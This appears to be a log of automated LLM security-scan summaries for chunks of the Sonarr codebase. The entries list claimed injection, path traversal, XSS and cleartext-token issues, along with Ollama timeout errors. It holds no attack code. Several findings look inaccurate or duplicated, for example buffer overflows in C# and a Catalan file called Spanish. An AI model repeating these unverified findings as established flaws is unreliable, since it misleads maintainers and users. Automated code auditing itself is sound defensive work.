vulnerability is CWE-707 (Improper Neutralization of Special Elements used in a Command) in the MoveSeriesService, which could allow command injection through path manipulation. Other medium severity issues include improper input validation, array index validation, and potential SQL injection vulnerabilities. The code also has potential insecure data storage and deserialization issues that could lead to data corruption or unexpected behavior when processing remote episode data. | Chunk 112: This analysis identified 9 security vulnerabilities across the Sonarr codebase, primarily focusing on input validation, command injection, and access control issues. Key findings include potential SQL injection vulnerabilities in the logging system, improper input validation in tag handling, and missing CSRF protection for tag operations. The vulnerabilities range from medium severity to potential critical impacts, particularly concerning data storage and access control. Most issues stem from insufficient validation of user-provided data and lack of proper sanitization in logging and tag management components. | Chunk 113: This analysis identified 22 security vulnerabilities in the Sonarr database repository code. The primary concerns are SQL injection vulnerabilities due to improper parameterization of table and column names in several methods, along with multiple input validation issues. Additionally, there are several resource management concerns related to database connection handling. Most of these vulnerabilities are medium to high severity, with SQL injection being the most critical. The code lacks proper input validation for various parameters and doesn't consistently manage database connections, which could lead to resource leaks under high load. | Chunk 114: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 116: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 117: This analysis identified 13 Command Injection vulnerabilities (CWE-707) across multiple migration files in the Sonarr codebase. All identified vulnerabilities stem from the use of string concatenation to build SQL UPDATE statements without proper parameterization, which allows attackers to inject malicious SQL commands. The vulnerabilities are present in 13 different migration files, including those handling season folder formats, episode file paths, indexer settings, email configurations, and more. These vulnerabilities could potentially lead to unauthorized database access, data manipulation, or even code execution if exploited by an attacker with access to the configuration or database. | Chunk 118: This analysis identified 9 security vulnerabilities across the codebase, primarily focusing on input validation, authentication, and data handling issues. Key findings include potential command injection in SQL parsing, path traversal in media cover handling, and CSRF/XSS vulnerabilities in the AniList OAuth flow. Several medium-severity issues were found related to improper input validation, log output neutralization, and insecure data storage. The vulnerabilities span across migration framework, media cover handling, and import list functionality, with particular attention to the AniList integration which handles sensitive authentication data. | Chunk 119: This analysis identified 10 security vulnerabilities across the import list functionality. The main concerns include potential command injection in AniList API queries, improper input validation in Trakt and RSS settings, XSS vulnerabilities in title handling, and cleartext storage of sensitive API tokens in Trakt, MyAnimeList, and Simkl import lists. These vulnerabilities could lead to unauthorized API access, XSS attacks, and information disclosure. Most vulnerabilities are medium severity but could be exploited to gain unauthorized access to external APIs or affect application behavior through malformed inputs. | Chunk 120: This analysis identified 8 security vulnerabilities across the Sonarr import list functionality. Key issues include potential XSS vulnerabilities in the Plex import list OAuth handling, improper input validation in multiple components, insecure storage of authentication tokens, and potential resource exhaustion issues. The most critical concerns involve the storage of sensitive tokens without encryption and the lack of proper validation in API request generation. These vulnerabilities could allow attackers to steal authentication tokens, perform unauthorized API operations, or inject malicious data into the system. | Chunk 121: This analysis identified 7 security vulnerabilities in the Sonarr download client code. The main concerns include potential command injection through external URLs, improper input validation, and resource handling issues. Most vulnerabilities are medium severity but could potentially lead to code execution or resource leaks. The code lacks comprehensive input sanitization for external data sources and doesn't properly validate torrent or NZB file contents, which could be exploited by malicious indexers or torrent files. | Chunk 122: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 123: This analysis identified 9 security vulnerabilities across the Freebox, Flood, and uTorrent download client implementations. Key issues include potential command injection in Freebox API calls, insecure storage of authentication tokens, improper input validation in category handling, and missing encryption of sensitive data. The most critical vulnerability is the potential command injection in Freebox API calls (CWE-77) and improper authentication handling (CWE-287). Several medium severity issues were found related to input validation, path traversal, and missing encryption of sensitive data. | Chunk 124: This analysis identified several medium-severity security vulnerabilities in the Sonarr download client implementations. Key issues include hardcoded default tokens/passwords in Aria2, Deluge, and SABnzbd configurations, potential path traversal vulnerabilities in file path handling, and insufficient input validation in directory path processing. These vulnerabilities could allow unauthorized access to download clients or enable directory traversal attacks during file operations. The most critical concern is the hardcoded default credentials that could be easily discovered and exploited by attackers. | Chunk 125: This analysis identified 11 security vulnerabilities in the Sonarr download client implementations. The most critical issues are command injection vulnerabilities in the rTorrent integration (CWE-707) where user-provided URLs and parameters are not properly sanitized before being passed to XML-RPC commands. Additionally, there are multiple input validation issues (CWE-20) in the Download Station settings and task handling that could lead to path traversal or injection attacks. The vulnerabilities range from medium to high severity and affect both rTorrent and Download Station integration components. | Chunk 126: This analysis identified 10 security vulnerabilities across the rTorrent, Transmission, and Tribler download client implementations. Key issues include potential command injection in rTorrent client operations, improper input validation in Transmission settings, and authentication weaknesses in Transmission proxy. The vulnerabilities range from medium severity path traversal issues to high severity command injection risks. Most vulnerabilities stem from insufficient input validation and sanitization of user-provided configuration values, particularly category names and paths used in API calls to external torrent clients. | Chunk 127: This analysis identified several security vulnerabilities across the download client implementations in Sonarr. Key issues include path traversal vulnerabilities in blackhole clients, potential command injection in Nzbget and NzbVortex proxies, and deserialization concerns. The most critical issues involve improper input validation leading to path traversal attacks, and the lack of CSRF protection in API endpoints. Additionally, there are medium severity issues related to authentication handling, buffer overflows, and format string usage in API processing code. | Chunk 128: This analysis identified 8 potential security vulnerabilities in the Hadouken download client implementation. The main concerns include command injection risks through torrent names and paths, improper input validation of Hadouken API responses, path traversal vulnerabilities, and potential deserialization issues. Most vulnerabilities are rated as Medium severity, but could lead to significant impacts if exploited in a production environment. The code lacks proper sanitization of external data and doesn't validate the structure of API responses from Hadouken. | Chunk 129: This analysis identified 4 medium severity vulnerabilities in the Sonarr codebase related to input validation, command injection, and deserialization. The main concerns are around the XEM API integration where external data is processed without sufficient validation, potentially leading to data corruption or unexpected behavior. The vulnerabilities are primarily in the scene mapping and XEM service components, with potential impacts ranging from data processing issues to possible command injection through API responses. | Chunk 130: This analysis identified 4 medium severity and 2 low severity vulnerabilities in the Sonarr codebase. The main concerns include potential XSS vulnerabilities in queue handling, improper input validation in queue processing, array index validation issues in quality profile updates, and command injection risks in search operations. Additionally, there are concerns about cleartext storage of sensitive information in release profiles and potential access control issues in quality profile deletion. Most vulnerabilities are related to input validation and data processing without proper bounds checking or sanitization. | Chunk 131: This analysis identified 4 high severity and 3 medium severity vulnerabilities in the Sonarr codebase. The primary concerns are command injection vulnerabilities in the script import functionality (CWE-77, CWE-707, CWE-913) and path traversal issues in disk scanning operations (CWE-22). Additionally, there are input validation issues in delay profile management (CWE-20, CWE-129) and potential CSRF vulnerabilities in task management (CWE-352). These vulnerabilities could lead to arbitrary code execution, unauthorized access, and data manipulation, with the command injection vulnerabilities being particularly critical as they could allow full system compromise. | Chunk 132: This analysis identified 10 security vulnerabilities across the media file handling components of Sonarr. The most critical issues are path traversal vulnerabilities in MediaFileDeletionService that could allow arbitrary file deletion, and potential command injection risks in file operations. Other medium severity issues include CSRF vulnerabilities, XSS in logging, and improper input validation in file import operations. These vulnerabilities could lead to unauthorized file access, data loss, or privilege escalation within the Sonarr system. | Chunk 133: This analysis identified 9 potential security vulnerabilities in the Sonarr media file import functionality. Key issues include improper input validation in path handling, potential command injection through external tool execution, path traversal risks, and resource allocation concerns. The code also has cleartext storage of sensitive release information and lacks proper access control validation for subtitle processing. Most vulnerabilities are medium severity, with potential for information disclosure and resource exhaustion attacks. No critical or high severity vulnerabilities were found in this specific code chunk, but the import system's interaction with external tools and file operations presents several areas for improvement. | Chunk 134: This analysis identified 7 security vulnerabilities in the Sonarr codebase, with 2 high severity issues (Path Traversal and Command Injection) and 5 medium severity issues (Input validation, CSRF, array indexing, resource management, and access control). The main concerns are around improper input validation and path handling that could lead to directory traversal attacks, command injection, and unauthorized data access. The code lacks proper CSRF protection for API endpoints and doesn't validate all user-provided parameters thoroughly. | Chunk 135: This analysis identified 7 security vulnerabilities in the Sonarr codebase, including command injection risks, input validation issues, authentication weaknesses, and potential deserialization vulnerabilities. The most critical issues involve command injection through dynamic casting and improper input validation in command execution. Medium severity issues include potential resource leaks, access control problems, and deserialization risks. The authentication system also has potential cleartext storage issues and CSRF vulnerabilities that need attention. | Chunk 136: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 137: This analysis identified 9 security vulnerabilities across the Sonarr notification system. Key issues include XSS vulnerabilities in message handling, command injection risks in Synology indexer operations, path traversal in shell command execution, and insecure storage of Twitter API credentials. The most critical vulnerabilities are in the Synology indexer proxy which could allow arbitrary command execution, and the webhook proxy which could be exploited for path traversal attacks. Additionally, Twitter API credentials are stored without encryption, and several notification handlers lack proper input validation and sanitization. | Chunk 138: The Discord notification system in Sonarr has several potential security vulnerabilities including XSS risks from unescaped user data, input validation issues with field lengths, and potential CSRF vulnerabilities in configuration handling. While the core functionality appears robust, the integration with Discord's webhook system introduces risks from untrusted user input that could be exploited through specially crafted notifications. The code lacks comprehensive input sanitization and validation for fields that are directly rendered in Discord's rich text format, potentially allowing attackers to craft malicious notifications that could execute JavaScript or break formatting. | Chunk 139: This analysis identified 6 security vulnerabilities in the Sonarr codebase. The most critical issue is CWE-312 (Cleartext Storage of Sensitive Information) with the hardcoded Trakt ClientId, which could allow unauthorized API access. CWE-77 (Command Injection) in the CustomScript notification handler poses a high risk as it could allow arbitrary command execution through specially crafted series titles. Other medium severity issues include improper authentication in Trakt OAuth flow, missing encryption of sensitive data, and potential log injection vulnerabilities in MediaBrowser notifications. All vulnerabilities are related to input validation, authentication, and secure handling of sensitive information. | Chunk 140: This analysis identified 9 security vulnerabilities in the Sonarr notification system, including XSS vulnerabilities in Telegram notifications, input validation issues in Telegram settings, cleartext storage of sensitive Plex tokens, command injection and SSRF vulnerabilities in Plex server communication, CSRF issues in OAuth flows, and log injection risks. Most vulnerabilities are medium to high severity, with several potentially leading to privilege escalation or information disclosure. | Chunk 141: This analysis identified 10 security vulnerabilities across the Sonarr notification system. The most concerning issues include potential XSS vulnerabilities in Slack notifications, improper input validation in Gotify settings, and information exposure risks in various notification components. Several medium-severity issues were found related to command injection in XBMC integration, missing encryption of sensitive data, and potential buffer overflows in version comparison logic. These vulnerabilities could allow attackers to execute malicious code, steal credentials, or manipulate notification content, potentially leading to unauthorized access to integrated services or information disclosure. | Chunk 142: This analysis identified 4 medium severity vulnerabilities in the Sonarr validation codebase. The main concerns include potential command injection vulnerabilities in path validation, improper input validation in port handling, and path traversal issues. The localization service also shows potential CSRF vulnerabilities. Most of these issues stem from the validation layer not properly sanitizing or neutralizing input values before they are used in system operations or logging. While no critical or high severity vulnerabilities were found, these medium severity issues could compound to create more significant security problems, particularly around path handling and command execution. | Chunk 143: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/tr.json). This file contains only translation strings and configuration values for the Turkish language localization of the Sonarr application. It does not contain executable code, database queries, user inputs, or any components that could introduce security vulnerabilities such as SQL injection, XSS, command injection, or authentication issues. The file is purely a data structure used for UI localization and does not process external inputs or interact with system resources in a way that would create security risks. | Chunk 144: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/tr.json). This file contains only translation strings and configuration values for the Turkish language localization of Sonarr. It does not contain executable code that could introduce security vulnerabilities such as input validation issues, command injection, SQL injection, XSS vulnerabilities, or other code-level security concerns. The file is purely a data structure used for UI text localization and does not execute any user-provided input processing or system interactions that would typically introduce security risks. | Chunk 146: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/hu.json). This file contains only language translations and configuration text strings for the Sonarr application's Hungarian localization. It does not contain executable code, database queries, user input processing, or any components that would typically introduce security vulnerabilities such as SQL injection, XSS, command injection, or authentication issues. The file is purely a data resource used for displaying localized text in the user interface. | Chunk 147: No security vulnerabilities were found in the provided JSON localization file (nl.json). This file contains only localized string translations for the Sonarr application interface and does not include any executable code that could introduce security vulnerabilities such as injection flaws, authentication issues, or input validation problems. The file is purely a data structure used for UI localization and does not contain any processing logic that could be exploited. | Chunk 148: {'total_vulnerabilities': 5, 'critical': 0, 'high': 0, 'medium': 3, 'low': 2, 'recommendations': ['Implement proper access control checks for tag deletion operations', 'Sanitize all user-provided content in localization strings', 'Add validation rules for tag name parameters', 'Implement fallback mechanisms for localization failures', 'Ensure proper UTF-8 encoding handling for Japanese text']} | Chunk 149: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/de.json). This file contains only language translations and configuration strings for the German localization of Sonarr, with no executable code, input processing, or security-sensitive operations that could introduce vulnerabilities. The file is purely a data structure used for UI text localization and does not contain any code that could be exploited for injection attacks, authentication bypasses, or other security issues. | Chunk 150: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/de.json). This file contains German language translations for the Sonarr application interface and does not include any executable code that could introduce security vulnerabilities such as input validation issues, command injection, SQL injection, XSS vulnerabilities, or other code-level security concerns. The file is purely a data structure containing key-value pairs of localized strings and does not contain any logic, user input processing, database queries, or external API calls that could be exploited. | Chunk 151: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/ru.json). This file contains only translation strings and configuration values for the Russian language localization of the Sonarr application. It does not contain any executable code, input processing, or security-sensitive operations that would typically introduce vulnerabilities such as SQL injection, XSS, command injection, or authentication issues. The file is purely a data structure used for UI localization and does not process external inputs or interact with system resources in a way that would create security risks. | Chunk 152: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/ru.json). This file contains only localized string translations for the Sonarr application interface and does not include any executable code that could introduce security vulnerabilities such as input validation issues, command injection, SQL injection, or authentication flaws. The file is purely a data structure for UI localization and does not contain any user-controllable inputs, database queries, or external system interactions that would typically lead to security vulnerabilities. | Chunk 153: No security vulnerabilities were found in the provided JSON localization file (pl.json). This file contains only localized string translations and does not include any executable code that could introduce security vulnerabilities such as input validation, authentication logic, SQL queries, or command execution. The file is purely data-driven and serves as a resource for user interface text localization. | Chunk 155: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/uk.json). This file contains only localized string translations for the Sonarr application interface and does not include any executable code, configuration parameters, or user input processing that could introduce security vulnerabilities. The file is purely a data resource used for internationalization and does not contain any logic that could be exploited for injection attacks, authentication bypasses, or other security issues. | Chunk 157: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/fi.json). This file contains only language translations and configuration strings for the Sonarr application's Finnish localization. It does not contain executable code that could introduce security vulnerabilities such as input validation issues, command injection, SQL injection, or authentication flaws. The file is purely a data structure used for UI text localization and does not process external inputs or interact with system resources directly. | Chunk 158: No security vulnerabilities were found in the provided source code chunk. The chunk contains JSON localization files for different languages (Slovak and Portuguese) used in the Sonarr application. These files primarily contain key-value pairs for user interface text translations and do not contain executable code that could introduce security vulnerabilities such as SQL injection, command injection, XSS, or authentication issues. The files are purely data structures used for internationalization purposes. | Chunk 159: This file is a JSON localization file (en.json) containing text strings and messages used throughout the Sonarr application. It does not contain executable code that would introduce traditional security vulnerabilities like SQL injection, command injection, or XSS. The file primarily serves as a data repository for UI text and messages. No code execution vulnerabilities were found in this file. | Chunk 160: No security vulnerabilities were found in the provided source code chunk. This file is a JSON localization file (en.json) containing text strings and messages used throughout the Sonarr application. The file contains no executable code, no user input processing, no external API calls, and no security-sensitive operations. It's purely a data file used for internationalization and does not introduce any direct security risks. | Chunk 161: No security vulnerabilities were found in the provided source code chunk. The chunk contains JSON localization files for various languages (Italian, Croatian, Serbian, Estonian, Mexican Spanish, Bosnian) used in the Sonarr application. These files primarily contain key-value pairs for user interface text translations and do not contain executable code that could introduce security vulnerabilities such as SQL injection, command injection, XSS, or authentication issues. The files are purely data structures used for internationalization and do not appear to be directly involved in security-sensitive operations. | Chunk 162: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/fr.json). This file contains only translation strings and configuration values for the Sonarr application's French localization. It does not contain any executable code, database queries, user input processing, or external API calls that would typically introduce security vulnerabilities. The file is purely a data structure used for UI text localization and does not process or handle any user-provided input that could lead to injection attacks, authentication issues, or other security concerns. | Chunk 163: No security vulnerabilities were found in the provided source code chunk. This file is a JSON localization file (fr.json) containing French translations for the Sonarr application interface. The file contains no executable code, no user input processing, no database queries, and no external dependencies that could introduce security vulnerabilities. All content consists of key-value pairs with string values representing UI text and messages, with no code execution paths that could lead to injection attacks, authentication issues, or other security concerns. | Chunk 164: No security vulnerabilities were found in the provided JSON localization files. These files contain only language translations and configuration messages for the Sonarr application. They are static data files that do not execute code, process user input, or interact with external systems in a way that would introduce security vulnerabilities. The files are purely for display purposes and do not contain any executable code, database queries, file operations, or network communications that could be exploited. | Chunk 165: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/ca.json). This file contains only language translations and UI text strings for the Sonarr application's Catalan localization. It does not contain any executable code, configuration logic, or data processing that could introduce security vulnerabilities such as injection attacks, authentication issues, or input validation problems. The file is purely a static resource for user interface localization. | Chunk 166: No security vulnerabilities were found in the provided source code chunk. This file is a JSON localization file (ca.json) containing Spanish language translations for the Sonarr application interface. The file contains no executable code, no user input processing, no external API calls, and no security-sensitive operations. It's purely a data file used for internationalization purposes, so there are no traditional security vulnerabilities such as SQL injection, XSS, command injection, or authentication issues present in this specific file. | Chunk 168: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/ko.json). This file contains only key-value pairs for Korean language translations and does not include any executable code, input processing, or security-sensitive operations that could introduce vulnerabilities such as injection attacks, authentication issues, or data handling risks. The file is purely a configuration resource for UI text localization. | Chunk 169: No security vulnerabilities were found in the provided JSON localization files. These files contain only language translations and configuration strings for the Sonarr application's user interface. The files do not contain executable code, database queries, user input processing, or any components that could introduce security vulnerabilities such as SQL injection, XSS, command injection, or authentication issues. All files are static JSON configuration data used for UI localization purposes. | Chunk 170: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/pt_BR.json). This file contains only translation strings and configuration messages for the Sonarr application's Portuguese (Brazil) localization. It does not contain any executable code, database queries, user input processing, or external API calls that would typically introduce security vulnerabilities. The file is purely a data structure used for UI text localization and does not process or handle any user-provided data that could lead to injection attacks, authentication issues, or other security concerns. | Chunk 171: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/pt_BR.json). This file contains only language translations and configuration strings for the Sonarr application's Portuguese (Brazil) localization. It does not contain executable code, database queries, user input processing, or any components that would typically introduce security vulnerabilities such as SQL injection, XSS, command injection, or authentication issues. The file is purely a data structure used for UI text localization and does not process external inputs or interact with system resources in a way that would create security risks. | Chunk 172: No security vulnerabilities were found in the provided JSON localization files. These files contain only translation strings and configuration values for different languages. They do not include executable code, input processing, database queries, or external interactions that could introduce security vulnerabilities. The files are purely data structures used for UI localization and do not contain any code that could be exploited for injection attacks, authentication bypasses, or other security issues. | Chunk 173: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/es.json). This file contains only translation strings and configuration messages for the Sonarr application's Spanish localization. The file does not contain any executable code, input processing, or security-relevant logic that could introduce vulnerabilities such as injection attacks, authentication issues, or data handling problems. All content consists of key-value pairs with string translations that are used for UI display and user interaction. | Chunk 174: No security vulnerabilities were found in the provided JSON localization file (src/NzbDrone.Core/Localization/Core/es.json). This file contains only language translations and configuration text strings for the Sonarr application's Spanish localization. It does not contain any executable code, database queries, user input processing, or external API calls that would typically introduce security vulnerabilities. The file is purely a data structure used for UI text localization and poses no direct security risks. | Chunk 175: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 176: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 177: This analysis identified 6 security vulnerabilities across the provided test files. The most critical issue is a potential command injection vulnerability (CWE-78) in the process management functionality, followed by medium severity issues including input validation problems (CWE-20), missing CSRF protection (CWE-352), path traversal concerns (CWE-22), array indexing issues (CWE-129), and potential XSS vulnerabilities (CWE-79). These vulnerabilities primarily stem from the test code's lack of validation and security checks, which likely indicate similar issues in the production code. The test files reveal that the application's security mechanisms are not thoroughly tested, potentially leaving the main application vulnerable to these security issues. | Chunk 178: This OpenAPI specification for Sonarr v5 API contains several potential security vulnerabilities related to input validation, CSRF protection, XSS, path traversal, and data handling. While the specification itself doesn't contain executable code, it defines the API contract that could expose these vulnerabilities in the implementation. The main concerns are around insufficient input validation, lack of CSRF protection for state-changing operations, and potential path traversal issues with file access endpoints. These vulnerabilities could be exploited by attackers to perform unauthorized actions, access sensitive data, or manipulate system behavior through the API interface. | Chunk 179: This openapi.json file defines the API endpoints for Sonarr but lacks explicit security controls. The main vulnerabilities identified include improper input validation, potential path traversal issues, XSS risks, and insufficient access control mechanisms. While the JSON schema itself doesn't contain direct code vulnerabilities, it defines parameters that could lead to security issues in backend implementations. The specification should be enhanced with explicit validation rules, access control requirements, and data sanitization guidelines to improve overall security posture. | Chunk 180: No direct code vulnerabilities found in the openapi.json file. This file is a JSON schema definition file that defines the API contract for the Sonarr application. While it doesn't contain executable code that could introduce runtime vulnerabilities, it does define security aspects through its schema definitions and security schemes. The file primarily defines data structures and API endpoints but doesn't contain actual implementation code that could introduce vulnerabilities like SQL injection, command injection, or XSS. The security aspects are defined through the API key authentication mechanisms (X-Api-Key and apikey) but no implementation details are present in this file to evaluate. | Chunk 181: This analysis identified 10 security vulnerabilities across the Sonarr API codebase. Key issues include potential XSS vulnerabilities in series titles, improper input validation for tags and paths, path traversal risks, and missing CSRF protection. Several medium-severity issues were found related to resource consumption, deserialization of untrusted data, and lack of input sanitization. The most critical areas for remediation are the SeriesEditorController's handling of user-provided paths and tags, and the lack of CSRF protection on critical endpoints. The code also lacks proper input validation for various parameters, which could lead to resource exhaustion or unexpected behavior when processing large datasets. | Chunk 182: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 183: This code analysis identified 11 security vulnerabilities across the Sonarr API codebase. Key issues include path traversal vulnerabilities in log file handling (CWE-22, CWE-79), authentication gaps allowing unauthorized access to log files (CWE-287), and potential command injection risks in command processing (CWE-77, CWE-913). Several medium severity issues were found related to input validation, XSS vulnerabilities, and insecure deserialization. The most critical vulnerability is the path traversal issue in LogFileControllerBase which could allow arbitrary file reads. All identified vulnerabilities are in the logging and command processing components of the application. | Chunk 184: This analysis identified 8 security vulnerabilities across the Sonarr codebase, including command injection risks in the update process, path traversal issues during file operations, and potential authentication bypasses. The most critical vulnerability is CWE-77 (Command Injection) in the update process which could allow arbitrary code execution. Other medium severity issues include path traversal in update operations, insecure data storage, and improper input validation in remote path mapping operations. All vulnerabilities stem from insufficient input validation, path sanitization, and authentication checks in the update and API components. | Chunk 185: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 186: This OpenAPI specification for Sonarr API contains several potential security vulnerabilities related to input validation, path traversal, and authentication. While the specification itself doesn't contain executable code, it defines endpoints that could be vulnerable to path traversal attacks, XSS issues, and improper authentication handling. The specification lacks explicit validation rules for many parameters, which could lead to buffer overflow issues in backend implementations. Additionally, there's no explicit authentication requirement defined for endpoints, potentially allowing unauthorized access to sensitive operations. The main vulnerabilities are related to insufficient input validation and potential path traversal issues in file access endpoints. | Chunk 187: This OpenAPI specification for Sonarr API contains several potential security vulnerabilities. The main concerns include insufficient input validation that could lead to various injection attacks, cleartext storage of sensitive information including passwords and API keys, potential XSS vulnerabilities when rendering string fields, and insufficient authentication mechanisms. Additionally, there are concerns about data integrity verification, deserialization vulnerabilities, path traversal issues, and potential buffer overflow conditions. While this is an API specification file and not the actual implementation, these issues highlight areas where the backend implementation should be carefully reviewed for security hardening. | Chunk 188: This analysis identified 9 potential security vulnerabilities in the Sonarr API code. Key issues include XSS vulnerabilities in release data handling, input validation gaps in release processing, potential buffer overflows, and missing authentication/CSRF protection. The most critical areas are the ReleasePushController which handles external release data and the CustomFilterController which processes untrusted filter data. Several medium-severity issues related to input validation, path traversal, and memory handling were also identified. These vulnerabilities could potentially allow attackers to inject malicious data, perform unauthorized operations, or cause application instability. | Chunk 189: This analysis identified 12 potential security vulnerabilities across the Sonarr API controllers. Most vulnerabilities are related to improper input validation (CWE-20) and cross-site scripting (CWE-79). The main issues involve insufficient validation of user-provided parameters in calendar, configuration, custom formats, episode, and root folder endpoints. Additionally, there are concerns about password validation in the host configuration controller and potential XSS vulnerabilities in calendar feed generation. These vulnerabilities could lead to data corruption, unexpected behavior, or in some cases, code execution in affected components. | Chunk 190: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 191: The code analysis identified 9 security vulnerabilities across the Sonarr API controllers. Key issues include command injection vulnerabilities in ManualImportController and CommandController, lack of CSRF protection, path traversal risks, and deserialization vulnerabilities. The most critical issues involve potential command injection and deserialization of untrusted data that could allow arbitrary code execution. Several medium severity issues related to input validation and buffer overflows were also identified. Most vulnerabilities stem from insufficient validation of user-provided data before processing in service layers or command execution contexts. | Chunk 192: This analysis identified 7 security vulnerabilities in the Sonarr test common components. The most critical issue is Command Injection (CWE-77) in the NzbDroneRunner class where command line arguments are constructed without proper sanitization. Medium severity issues include cleartext storage of sensitive information (CWE-312), improper access control (CWE-284), and cleartext transmission of sensitive information (CWE-319). The vulnerabilities primarily affect the test environment rather than the production application, but could lead to test instability, information disclosure, and potential privilege escalation in test scenarios.